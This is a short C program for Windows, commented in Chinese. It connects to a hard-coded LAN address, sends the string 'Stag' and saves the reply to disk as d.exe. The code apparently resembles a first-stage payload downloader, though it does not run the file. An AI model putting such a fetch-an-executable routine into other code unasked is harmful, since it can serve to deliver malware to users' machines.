#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char *serverIP = "192.168.1.250"; // 服务器IP地址
    int serverPort = 4001;           // 服务器端口
    char buffer[1024];
    int result, recvSize;

    // 初始化Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // 创建Socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed.\n");
        return 1;
    }

    // 指定服务器地址
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(serverIP);
    server.sin_port = htons(serverPort);

    // 连接到服务器
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection failed.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 发送请求（这里假设发送一个特定请求来触发文件的发送）
    char *request = "Stag";

    send(sock, request, strlen(request), 0);

    // 打开文件用于写入
    FILE *file = fopen("d.exe", "wb");
    if (file == NULL) {
        printf("Failed to open file.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 接收文件
    while ((recvSize = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
        fwrite(buffer, 1, recvSize, file);
    }

    // 清理
    fclose(file);
    closesocket(sock);
    WSACleanup();

    printf("File downloaded successfully.\n");
    return 0;
}
